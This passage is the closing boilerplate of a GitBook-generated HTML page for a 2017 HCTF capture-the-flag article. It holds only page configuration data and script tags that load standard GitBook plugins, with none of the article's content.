CTF.","extension":null},"file":{"path":"articals/2017hctf.md","mtime":"2019-04-27T10:01:13.799Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-27T10:26:29.662Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/jquery.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/jquery.mousewheel.pack.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/jquery.fancybox.pack.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/jquery.fancybox-buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

